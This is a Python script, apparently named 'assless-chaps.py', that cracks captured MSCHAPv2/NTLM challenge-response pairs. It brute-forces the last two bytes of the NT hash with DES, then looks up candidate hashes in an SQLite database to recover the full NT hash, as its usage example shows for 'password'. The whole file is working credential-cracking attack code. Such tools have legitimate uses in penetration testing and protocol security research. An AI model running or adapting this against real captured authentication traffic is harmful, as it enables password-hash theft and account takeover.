from sys import argv
from Crypto.Cipher import DES
import subprocess
from time import sleep
from os import path
import sqlite3

# Usage python3 assless-chaps.py <challenge> <response> <nthash hashlist> <twobyte lookup list>
# e.g. python3 assless-chaps.py 5d79b2a85966d347 556fdda5f67d2b746ca3315fd8b93adcab5c792790a92e87 hashes.db twobytes
# [+] Found in 65533 tries: 586c
# [+] Found hash: 8846f7eaee8fb1
# [+] Found hash: 17ad06bdd830b7
# [+] Full hash: 8846f7eaee8fb117ad06bdd830b7586c
# 8846f7eaee8fb117ad06bdd830b7586c is the NT hash for 'password'

# Copied from https://github.com/SecureAuthCorp/impacket/blob/1c21a460ae1f8d20e7c35c2d4b123800472feeb3/impacket/ntlm.py#L534
def __expand_DES_key(key):
  # Expand the key from a 7-byte password key into a 8-byte DES key
  key  = key[:7]
  key += bytearray(7-len(key))
  s = bytearray()
  s.append(((key[0] >> 1) & 0x7f) << 1)
  s.append(((key[0] & 0x01) << 6 | ((key[1] >> 2) & 0x3f)) << 1)
  s.append(((key[1] & 0x03) << 5 | ((key[2] >> 3) & 0x1f)) << 1)
  s.append(((key[2] & 0x07) << 4 | ((key[3] >> 4) & 0x0f)) << 1)
  s.append(((key[3] & 0x0f) << 3 | ((key[4] >> 5) & 0x07)) << 1)
  s.append(((key[4] & 0x1f) << 2 | ((key[5] >> 6) & 0x03)) << 1)
  s.append(((key[5] & 0x3f) << 1 | ((key[6] >> 7) & 0x01)) << 1)
  s.append((key[6] & 0x7f) << 1)
  return bytes(s)

def lookup_twobytes(i):
  # Optimised brute for last two bytes based on prioritised lookup file
  ciphertext = NTResponse[16:24]
  with open(twobytelist,'r') as tbs:
    for x in tbs.read().split('\n'):
      i += 1
      candidate = b''.fromhex(x)+b'\x00\x00\x00\x00\x00'
      des = DES.new(__expand_DES_key(candidate),DES.MODE_ECB)
      check = des.encrypt(Challenge)
      if check == ciphertext:
        twobytes = x
        print(f'[+] Found in {i} tries: {twobytes}')
        return (i,twobytes)
    print('[x] Two byte search exhausted - hash not found in hashlist')
    return (-1,b'')

def brute_twobytes(i):
  # Brute force last two bytes of the NTHash
  ciphertext = NTResponse[16:24]
  for i in range(i,65535):
    candidate = i.to_bytes(2,'big')+b'\x00\x00\x00\x00\x00'
    des = DES.new(__expand_DES_key(candidate),DES.MODE_ECB)
    check = des.encrypt(Challenge)
    if check == ciphertext:
      twobytes = i.to_bytes(2,"big").hex()
      print(f'[+] Found in {i} tries: {twobytes}')
      return (i,twobytes)
  print('[x] Two byte search exhausted - hash not found in hashlist')
  return (-1,b'')

def find_nthash(twobytes):
  # Find all NTHashes from our hashlist that end in those two bytes
  conn = sqlite3.connect(hashlist)
  try:
    cursor = conn.execute(f"select chunk1,chunk2 from hashes where twobytes='{twobytes.lower()}'")
  except sqlite3.OperationalError as e:
    print(f'[x] There is a problem with the hash DB: {e}')
    conn.close()
    return False 


  results = cursor.fetchall()
  if len(results) == 0:
    print('[x] No hashes found ending in those bytes')
    conn.close()
    return False
  else:
    print(f'[-] Found {len(results)} hashes ending in {twobytes.lower()}')

  for i, row in enumerate(results):
    if check_hash(row[0],0):
      print(f'[-] Found after {i} hashes.')
      if check_hash(row[1],8):
        print(f'[+] Full hash: {row[0]}{row[1]}{twobytes}')
        conn.close()
        return True

  print('[x] Hash not found in hashlist')
  conn.close()
  return False

def check_hash(chunk,start):
  # Check the chunk of NT hash as key computes the same ciphertext
  # start is 0 for chunk1, and 8 for chunk2
  ciphertext = NTResponse[start:start+8] 
  candidate = b''.fromhex(chunk[0:14])
  des = DES.new(__expand_DES_key(candidate),DES.MODE_ECB)
  check = des.encrypt(Challenge)
  if check == ciphertext:
    print(f'[+] Found hash: {chunk}')
    return True
  return False

Challenge = b''.fromhex(argv[1])
NTResponse = b''.fromhex(argv[2])
hashlist = argv[3]
try:
  twobytelist = argv[4]
except IndexError:
  twobytelist = None

i = 0
if twobytelist != None:
  (i,twobytes) = lookup_twobytes(i)
else:
  print('[-] Two byte lookup file not provided, will brute force instead.')
  (i,twobytes) = brute_twobytes(i)
res = find_nthash(twobytes)
